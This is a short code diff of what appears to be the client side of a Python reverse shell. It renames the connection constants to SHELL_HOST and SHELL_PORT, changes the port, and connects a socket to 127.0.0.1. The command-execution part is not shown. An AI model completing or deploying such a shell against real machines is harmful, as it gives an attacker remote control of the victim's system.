@@ -3,8 +3,8 @@ import os
 import subprocess
 import sys
 
-SERVER_HOST = '127.0.0.1'
-SERVER_PORT = 5003
+SHELL_HOST = '127.0.0.1'
+SHELL_PORT = 5004
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
@@ -12,7 +12,7 @@ SEPARATOR = "<sep>"
 # create the socket object
 s = socket.socket()
 # connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
+s.connect((SHELL_HOST, SHELL_PORT))
 
 # get the current directory
 cwd = os.getcwd()
